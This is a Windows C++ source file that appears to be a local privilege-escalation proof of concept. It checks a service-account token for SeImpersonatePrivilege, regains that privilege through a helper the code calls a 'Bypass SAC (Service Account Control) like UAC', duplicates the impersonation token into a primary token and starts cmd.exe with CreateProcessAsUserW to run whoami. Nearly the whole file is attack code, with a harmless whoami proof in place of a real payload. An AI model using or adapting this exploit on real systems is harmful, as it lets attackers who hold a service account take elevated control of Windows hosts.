#include "otherapi.hpp"
#include "ntapi.hpp"
#include <sddl.h>

HANDLE NtCurrentProcessToken;
HANDLE NtCurrentThreadToken;
HANDLE ImpersonateThreadToken;

int wmain()
{
	NTSTATUS Status = 0;
	ULONG ReturnLength = 0;
	PTOKEN_MANDATORY_LABEL MandatoryIntegrityLevel = NULL;
	LPWSTR IntegritySidString = NULL;

	if ((SharedUserData->NtMajorVersion == 6 && SharedUserData->NtMinorVersion >= 2) || SharedUserData->NtMajorVersion > 6)
	{
		NtCurrentProcessToken = NtCurrentProcessToken();
		NtCurrentThreadToken = NtCurrentThreadToken();
	}
	else
	{
		Status = NtOpenProcessTokenEx(NtCurrentProcess(), TOKEN_ALL_ACCESS, NULL, &NtCurrentProcessToken);
		wprintf(L"[*] NtOpenProcessTokenEx: 0x%08lx, NtCurrentProcessToken = 0x%p\n", Status, NtCurrentProcessToken);
		Status = NtOpenThreadTokenEx(NtCurrentThread(), TOKEN_ALL_ACCESS, FALSE, NULL, &NtCurrentThreadToken);
		wprintf(L"[*] NtOpenThreadTokenEx: 0x%08lx, NtCurrentThreadToken = 0x%p\n", Status, NtCurrentThreadToken);
	}

	if (IsTokenImpersonatePrivilege(NtCurrentProcessToken) || IsTokenImpersonatePrivilege(NtCurrentThreadToken))
	{
		wprintf(L"[*] Already SeImpersonatePrivilege, exiting...\n");
		return 1;
		//wprintf(L"[*] Already SeImpersonatePrivilege, Try to getsystem...\n");//GetSystem
	}
	wprintf(L"[*] No SeImpersonatePrivilege, Try to make SeImpersonatePrivilege privilege back!\n");
	wprintf(L"[*] Note: This Technique require CurrentProcess Token SessionId == RawToken SessionId\n");

	// Require CurrentProcess TokenUser Allow get SeImpersonatePrivilege (most of time is ServiceAccount)
	// CurrentProcess Token SessionId = RawToken SessionId, and CurrentProcess Token Integrity >= RawToken Integrity 
	// S-1-5-6
	if (IsTokenServiceAccount(NtCurrentProcessToken))
		wprintf(L"[+] CurrentProcessToken is ServiceAccount!\n");
	else
	{
		wprintf(L"[!] Warning! CurrentProcessToken isn't a ServiceAccount!!!\n");
		wprintf(L"[!] Probably NOT Work!\n");
	}

	if (IsTokenElevatedLimited(NtCurrentProcessToken))
	{
		// Get SeAssignPrimaryTokenPrivilege Still Possible
		wprintf(L"[-] Token Elevated Limited, exiting..,\n");
		return ERROR_ELEVATION_REQUIRED;
	}

	Status = NtQueryInformationToken(NtCurrentProcessToken, TokenIntegrityLevel, NULL, ReturnLength, &ReturnLength);
	//wprintf(L"[*] NtQueryInformationToken: 0x%08lx, ReturnLength = %ld\n", Status, ReturnLength);
	if (ReturnLength && (Status == STATUS_BUFFER_TOO_SMALL || NT_SUCCESS(Status)))
	{
		MandatoryIntegrityLevel = (PTOKEN_MANDATORY_LABEL)HeapAlloc(RtlProcessHeap(), HEAP_ZERO_MEMORY, ReturnLength);
		if (MandatoryIntegrityLevel == NULL)
			return -1;
		Status = NtQueryInformationToken(NtCurrentProcessToken, TokenIntegrityLevel, MandatoryIntegrityLevel, ReturnLength, &ReturnLength);
		if (MandatoryIntegrityLevel->Label.Sid == NULL)
			return -2;
	}
	else
		return 2;
	//wprintf(L"[*] PSID: 0x%p\n", MandatoryIntegrityLevel->Label.Sid);
	SID IntegritySid = *((PISID)(MandatoryIntegrityLevel->Label.Sid));
	if (IntegritySid.SubAuthorityCount > 0 && IntegritySid.SubAuthority[0] >= SECURITY_MANDATORY_SYSTEM_RID)
		wprintf(L"[+] Integrity Level >= System OK!\n");
	else
	{
		// Just a warning, IIS APPPOOL\DefaultAppPool [High Mandatory Level] Work
		wprintf(L"[!] Warning! Integrity Level < System, Current IntegrityRID: 0x%08x\n", IntegritySid.SubAuthority[0]);
	}

	HeapFree(RtlProcessHeap(), 0, MandatoryIntegrityLevel);

	// Possible ?
	// To make you SessionId = 0, CreateProcessWithLogonW could help you spoof SessionId with PID Spoof???
	// example->CurrentProcessToken: NT AUTHORITY\NETWORK SERVICE, SessionId = 2, Integrity = System, No SeImpersonatePrivilege
	// But required TokenIntegrity and Priv enough to OpenProcess
	if (!ImpersonatePrivilegeBack())
	{
		wprintf(L"[-] Fail to reback SeImpersonatePrivilege.\n");
		return GetLastError();
	}
	wprintf(L"[*] Bypass SAC (Service Account Control) like UAC Owo\n");
	SECURITY_QUALITY_OF_SERVICE SecurityService = { 0 };
	OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
	HANDLE PrimaryTokenHandle = NULL;
	InitializeObjectAttributes(
		&ObjectAttributes,
		NULL,
		0,
		NULL,
		NULL
	);
	SecurityService.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
	SecurityService.ImpersonationLevel = SecurityImpersonation;
	SecurityService.ContextTrackingMode = SECURITY_DYNAMIC_TRACKING;
	SecurityService.EffectiveOnly = FALSE;
	ObjectAttributes.SecurityQualityOfService = &SecurityService;

	Status = NtDuplicateToken(ImpersonateThreadToken, TOKEN_ALL_ACCESS, &ObjectAttributes, FALSE, TokenPrimary, &PrimaryTokenHandle);
	wprintf(L"[*] NtDuplicateToken: 0x%08lx, PrimaryTokenHandle = 0x%p\n", Status, PrimaryTokenHandle);
	NtClose(ImpersonateThreadToken);
	if (NT_SUCCESS(Status))
	{
		STARTUPINFOW StartupInfo = { sizeof(StartupInfo) };
		PROCESS_INFORMATION pi = { 0 };
		RtlSecureZeroMemory(&pi, sizeof(pi));
		wchar_t cmd[MAX_PATH] = L"cmd.exe /c whoami.exe /all > C:\\Users\\Public\\whoami.txt";
		BOOL IsCreateSucess = CreateProcessAsUserW(PrimaryTokenHandle, NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &StartupInfo, &pi);//NtCreateUserProcess if you like
		wprintf(L"[*] CreateProcessAsUserW: %ls, IsCreateSucess = %d\n", cmd, IsCreateSucess);
		wprintf(L"[*] Last Win32Error: %d\n", NtCurrentTeb()->LastErrorValue);
		wprintf(L"[*] Last NtstatusError: 0x%08x\n", NtCurrentTeb()->LastStatusValue);
		if (IsCreateSucess == TRUE)
		{
			wprintf(L"[+] Check C:\\Users\\Public\\whoami.txt\n");
		}
		else
		{
			wprintf(L"[-] CreateProcessAsUserW Fail!\n");
		}
		NtClose(PrimaryTokenHandle);
		NtClose(pi.hProcess);
		NtClose(pi.hThread);
		Sleep(2000);
	}

	return 0;
}
